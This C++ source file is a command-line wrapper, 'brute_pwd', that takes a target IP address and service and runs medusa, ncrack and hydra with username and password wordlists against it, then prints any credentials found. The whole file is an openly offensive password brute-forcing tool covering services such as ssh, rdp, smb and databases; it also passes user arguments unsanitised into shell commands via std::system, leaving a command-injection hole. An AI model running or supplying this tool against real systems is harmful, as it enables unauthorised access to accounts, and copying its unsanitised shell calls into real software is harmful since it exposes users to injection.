#include "terminal_colours.h"
#include "standard_paths.h"

bool in_vector(const std::string &service, const std::vector<std::string> &vector);

int main(int argc, char **argv) {
  
  // if user input is incorrect
  if (argc != 4) {
    std::cout << "Usage: ./brute_pwd <ip address> <service> <tool>" << std::endl;
    std::cout << "Tools: -m (medusa), -n (ncrack), -h (hydra), -a (all consecutively)" << std::endl;
    return 0;
  }

  // take CLI arguments 1 - 3 and assign to ip_address, service and tool for command usage
  std::string ip_address, service, tool;
  std::stringstream args_conv;
  args_conv << argv[1] << " " << argv[2] << " " << argv[3];
  args_conv >> ip_address >> service >> tool;

  // assign path to base results string for individual tool usage
  std::stringstream result_conv;
  result_conv << rsltpth << ip_address << "_" << service << ".brute_pwd";
  std::string results = result_conv.str();

  // display text for user confirming input and service enumeration
  std::cout << "\n\t\t\t***Initiating " << service << " Password Bruteforce***\t\t\t\n\n" << "Target IP:\t" << ip_address << std::endl;

  // medusa (note: create function, shrink main)
  if ((tool.compare("-a") == 0) or (tool.compare("-m") == 0)) {
	  // service options
	  std::vector<std::string> medusasrv = {"csv", "ftp", "http", "imap", "mssql", "mysql", "nntp", "pcanywhere", "pop3", "postgres", "rexec", "rlogin", "rsh", "smb", "smtp", "snmp", "ssh", "svn", "telnet", "vmauthd", "vnc", "web"};
		// selected service is supported
		if (in_vector(service, medusasrv)) {
		  // not found bool
      bool m_bool = false;
      // results file for medusa output
      std::stringstream result_m;
      result_m << results << "_medusa.txt";
      std::string rm_file = result_m.str();
      // medusa command
      std::stringstream m_conv;
      m_conv << "timeout 300 medusa -h " << ip_address << " -U " << usrlst << " -P " << pwdlst << " -O " << rm_file << " -e ns -v 4 -M " << service << " > /dev/null 2>&1";
      std::string medusa = m_conv.str();
      std::cout << "\n\t\t\t ***Executing Medusa***\t\t\t" << std::endl;
      std::system(medusa.c_str());
      // search output for credentials
      std::string m_line;
      std::ifstream m_infile (rm_file.c_str());
      while (std::getline(m_infile, m_line)) {
        // print found credentials
        if (m_line.find("FOUND:") != std::string::npos) {
          std::cout << BOLDCYAN << m_line << std::endl;
          m_bool = true;
        }
      }
      // no credentials found
      if (m_bool == false) {
        std::cout << BOLDRED << "Medusa found no valid credentials" << std::endl;
      }
      std::cout << RESET;
		}
	}
  // ncrack (note: create function, shrink main)
	if ((tool.compare("-a") == 0) or (tool.compare("-n") == 0)) {
    // service options
    std::vector<std::string> ncracksrv = {"ftp", "telnet", "http", "https", "smb", "rdp", "vnc", "pop3", "pop3s", "imap", "sip", "redis", "postgresql", "mssqq", "mysql", "mongodb", "cassandra", "owa", "winrm", "dicom", "mqtt", "wordpress", "cvs"};
    // selected service is supportec
    if (in_vector(service, ncracksrv)) {
      // not found bool
      bool n_bool = false;
      // results file for ncrack ouput
      std::stringstream result_n;
      result_n << results << "_ncrack.txt";
      std::string rn_file = result_n.str();
      // ncrack command
      std::stringstream n_conv;
      n_conv << "timeout 300 ncrack -p " << service << " -u " << usrlst << " -P " << pwdlst << " -oA " << rn_file << " " << ip_address << " > /dev/null 2>&1";
      std::string ncrack = n_conv.str();
      std::cout << "\n\t\t\t ***Executing NCrack***\t\t\t" << std::endl;
      std::system(ncrack.c_str());
      // search output for credentials
      std::string n_line;
      std::ifstream n_infile (rn_file.c_str());
      while (std::getline(n_infile, n_line)) {
        // print found credentials
        if (n_line.find("credentials") != std::string::npos) {
          std::getline(n_infile, n_line);
          std::cout << BOLDCYAN << n_line << std::endl;
          n_bool = true;
        }
      }
      // no credentials found
      if (n_bool == false) {
        std::cout << BOLDRED << "NCrack found no valid credentials" << std::endl;
      }
      std::cout << RESET;
    }
	}
  // hydra (note: create function, shrink main)
	if ((tool.compare("-a") == 0) or (tool.compare("-h") == 0)) {
      // service options
    std::vector<std::string> hydrasrv = {"afp", "ciscoaaa", "cisco-aaa" , "ciscoauth", "cisco-auth", "ciscoenable", "cisco-enable", "cvs", "firebird", "ftp", "ftps", "httpformget", "http-form-get", "httpformpost", "http-form-post", "httpget", "http-get", "httphead", "http-head", "httpproxy", "http-proxy", "httpproxyurlenum", "http-proxy-urlenum", "icq", "imap", "irc", "ldap2", "ldap3", "mssql", "ms-sql", "mysql", "ncp", "nntp", "oracle", "oraclelistener", "oracle-listener", "oraclesid", "oracle-sid", "pcanywhere", "pc-anywhere", "pcnfs", "pop3", "postgres", "postgresql", "rdp", "redis", "rexec", "rlogin", "rsh", "r3", "r4", "sap" "s7", "sip", "smb", "smtp", "smtpenum", "smtp-enum", "snmp", "socks5", "ssh", "sshkey", "svn", "teamspeak", "telnet", "vmauthd", "vnc", "xmpp"};
    // selected service is supported
    if (in_vector(service, hydrasrv)) {
      // not found bool
      bool h_bool = false;
      // results file for hydra output
      std::stringstream result_h;
      result_h << results << "_hydra.txt";
      std::string rh_file = result_h.str();
      // hydra command
      std::stringstream h_conv;
      h_conv << "timeout 300 hydra -L " << usrlst << " -P " << pwdlst << " -q -e nsr -o " << rh_file << " " << ip_address << " " << service << " > /dev/null 2>&1";
      std::string hydra = h_conv.str();
      std::cout << "\n\t\t\t ***Executing Hydra***\t\t\t" << std::endl;
      std::system(hydra.c_str());
      // search output for credentials
      std::string h_line;
      std::ifstream h_infile (rh_file.c_str());
      while (std::getline(h_infile, h_line)) {
        // print found credentials
        if (h_line.find("login:") != std::string::npos) {
          std::cout << BOLDCYAN << h_line << std::endl;
          h_bool = true;

        }
      }
      // no credentials found
      if (h_bool == false) {
        std::cout << BOLDRED << "Hydra found no valid credentials" << std::endl;
      }
      std::cout << RESET;
    }
	}



}
// vector service search function
bool in_vector(const std::string &service, const std::vector<std::string> &vector) {
    return std::find(vector.begin(), vector.end(), service) != vector.end();
}
